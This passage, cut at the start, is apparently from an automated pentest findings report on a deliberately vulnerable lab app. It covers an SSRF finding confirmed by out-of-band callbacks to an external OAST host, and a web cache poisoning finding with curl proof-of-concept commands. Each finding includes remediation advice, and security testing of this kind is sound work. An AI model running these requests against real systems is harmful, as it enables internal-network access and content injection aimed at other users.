axu8okh3rfqtu0kjb2n20gaqgh0gomuad The token `axu8okh3rfqtu0kjb2n20gaqgh0gomuad` is the per-interaction correlation ID returned by the attacker's OAST server. It could only appear inside the application's HTML if the server had itself dereferenced the attacker URL and echoed the fetched body — this is a zero-false-positive proof of server-side fetch + response reflection. 3) Independent confirmation of the outbound leg: the OAST collector logged an HTTP interaction from the target's network egress with GET /verify3 HTTP/1.1 Host: oob3283e1830773.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in User-Agent: Java/17.0.20.1 Reproduced twice with independent fresh tokens: - oobcacdf7865765.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in (/rfi-repro-mine) - oob3283e1830773.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in (/verify3) Script: rfi_repro.sh, rfi_repro2.sh (evidence dir).
remediation: Do not fetch user-supplied URLs server-side. If remote content is a required feature: (1) restrict the scheme to an explicit allow-list (http/https only), rejecting file:, gopher:, dict:, ftp:, jar: and any other scheme; (2) validate the host against an allow-list of permitted domains and resolve the hostname, then re-check that the resolved IP is a public, non-loopback, non-link-local, non-private address (block 127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) to defeat DNS-rebinding and metadata-endpoint access; (3) disable HTTP redirects (30x) and re-validate every hop; (4) enforce a short timeout and response-size cap; (5) never render the fetched response inline into the page — if inclusion is intended, serve it from an isolated sandboxed origin.
verification_method: Re-ran the exploit twice, each time minting a fresh, unique OOB token via the oob() tool so no prior interaction could be responsible. Both runs returned HTTP 200 with the OAST server's per-interaction correlation body embedded in the app's HTML, and the OAST collector logged the server-initiated HTTP GET with User-Agent: Java/17.0.20.1.
verification_notes: Confirmed on LEVEL_1. The file:// scheme is rejected by the application (HTTP 500), so impact is HTTP(S) internal-network SSRF with full response read-back plus remote HTML/JS injection into a trusted origin. Because the fetched body is reflected into the app's DOM, this also provides an XSS delivery channel from an attacker-controlled origin. Levels 2+ of this module were not separately exercised.

title: Web cache poisoning via unkeyed banner parameter on /CachePoisoning/LEVEL_1
description: The shared-cache response for /CachePoisoning/LEVEL_1 is keyed ONLY on the route, ignoring the `banner` query parameter. Any unauthenticated request that reaches the origin first caches its attacker-supplied `banner` value, and that value is then served to ALL subsequent users of the same route (including requests with NO banner parameter and different User-Agents). Demonstrated: a planted banner value `${7*7}` (written by a prior request) persisted and was returned to anonymous requests carrying no banner param and a different UA, while the equivalent /LEVEL_2 endpoint correctly reflects per-request (no cache). This is a classic web cache poisoning / cache-key-deception issue: an attacker can seed the shared cache with arbitrary content (including HTML/JS) that is then delivered to all users of that route, enabling stored client-side content injection / defacement and potential session-fixation style response manipulation.
proof_of_concept:
# Plant any value (attacker-controlled, cached by route only):
curl -G --data-urlencode 'banner=POISONED' http://172.17.0.1:9090/VulnerableApp/CachePoisoning/LEVEL_1
# Read back as an ANOTHER user with NO banner param and a different UA — cached attacker value served:
curl http://172.17.0.1:9090/VulnerableApp/CachePoisoning/LEVEL_1
curl -A 'Mozilla/5.0 other-client' http://172.17.0.1:9090/VulnerableApp/CachePoisoning/LEVEL_1

Observed: repeated unique writes (m-AAA, m-BBB, UNIQ-*) all returned the already-cached value "${7*7}", and the no-param + different-UA read also returned "${7*7}" — the cache key ignores `banner`. By contrast /CachePoisoning/LEVEL_2 reflects the per-request value (m-CCC -> m-CCC), proving the L1 poisoning is the cache, not the handler.
remediation: Include the full query string (or at least security-relevant params) in the cache key, or bypass the shared cache for any request that carries the `banner` parameter / vary responses on it. Ensure the cache does not serve one user's parameter value to other users.
verification_method: manual
verification_notes: Reproduced multiple times: unique banner writes are ignored (cache hit on prior planted value) and the no-parameter / different-UA read returns the cached attacker value. Distinguished from per-request reflection by comparing LEVEL_1 (cached) vs LEVEL_2 (per-request).
